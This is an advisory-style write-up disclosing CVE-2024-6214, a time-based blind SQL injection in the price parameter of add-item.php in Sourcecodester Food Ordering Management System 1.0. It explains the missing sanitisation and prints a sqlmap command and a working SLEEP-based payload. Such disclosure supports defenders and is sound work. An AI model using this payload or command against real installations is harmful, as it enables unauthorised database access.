# SQL Injection vulnerability was discovered from Sourcecodester Food Ordering Management System 1.0 (add-item)
## CVE-2024-6214

Affected Project: Sourcecodester Food Ordering Management System 1.0

Official Website: https://www.sourcecodester.com/php/15689/food-ordering-management-system-php-and-mysql-free-source-code.html

Version: 1.0

Related Code file: /router/add-item.php

Injection parameter: price


## Vulnerability Analysis

1. Lack of Input Validation and Sanitization:
The price and name fields are directly used in the SQL query without any sanitization or validation. This allows an attacker to manipulate the SQL query by injecting malicious SQL code.

2. Use of Plain SQL Queries:
The script likely uses plain SQL queries to interact with the database. Without prepared statements, this approach is highly vulnerable to SQL injection.

## Demonstraation

Below is the admin-page.php. By clicking on **Add**, we can access add-item.php.

`http://172.16.76.1/foms/admin-page.php`

![image](https://github.com/jadu101/CVE/assets/76433661/607b0700-4d8f-4861-a3bc-1f43574e3f25)

We will first intercept the add-item traffic using Burp Suite:

![image-1](https://github.com/jadu101/CVE/assets/76433661/2f15e133-4b3c-4361-9b13-a5558c746485)

Save the intercepted add-item request to a .txt file and execute sqlmap towards it. 

parameter price is vulnerable to time-based blind sql injection

Below commands verifies the vulnerability:

`sqlmap -r foms-add-item.txt --batch`

![image-2](https://github.com/jadu101/CVE/assets/76433661/2d2940ac-b925-4994-9bb9-89a897dc9c05)

```
---
Parameter: price (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: name=asdafsd&price=123 AND (SELECT 1175 FROM (SELECT(SLEEP(5)))jrgF)&action=
---
```
